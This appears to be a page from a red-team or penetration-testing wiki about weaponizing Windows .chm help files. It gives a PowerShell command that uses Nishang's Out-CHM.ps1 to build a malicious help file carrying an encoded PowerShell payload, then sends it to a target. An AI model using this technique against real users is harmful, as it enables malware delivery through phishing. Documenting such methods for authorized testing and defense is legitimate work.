# HTML Help Files

## Theory

HTML Help File (.chm) is a file type created by Microsoft around 1997, for software documentation and user manuals. These files are consistent of HTML compressed pages that include indexes and content tables with hyperlinks to all pages. The interesting and dangerous part is that these hyperlinks can link to internal or external resources, **which can be weaponized to download malicious scripts or executables**.

<figure><img src="../../../.gitbook/assets/1 BgCnpJ0gbXdVZPt1hYqx8Q.webp" alt="" width="563"><figcaption><p>.chm file example</p></figcaption></figure>

The files are compressed and deployed in a binary format with the extension. CHM, for Compiled HTML. They can be viewed using the HTML Help program _**(hh.exe)**_ that runs whenever a user clicks on a compiled CHM file.

{% hint style="danger" %}
Though Microsoft stopped supporting the .chm format around 2007, they are still can be opened in modern Windows versions
{% endhint %}

## Practice

{% tabs %}
{% tab title="Powershell" %}
[Nishang](https://github.com/samratashok/nishang) comes with a script called [Out-CHM.ps1](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1) that we can use to craft our malicious HTML Help File.&#x20;

First, on a VM, download [**Microsoft HTML Help Workshop and Documentation**](https://www.microsoft.com/en-us/download/details.aspx?id=21138)**.** Then generate a malicious file as follow:

```powershell
Import-Module .\Out-CHM.ps1
Out-CHM -payload "powershell -e JABz...." -HCCPATH "C:\Program Files (x86)\HTML Help Workshop"
```

Now we can send the file to our target !
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e" %}
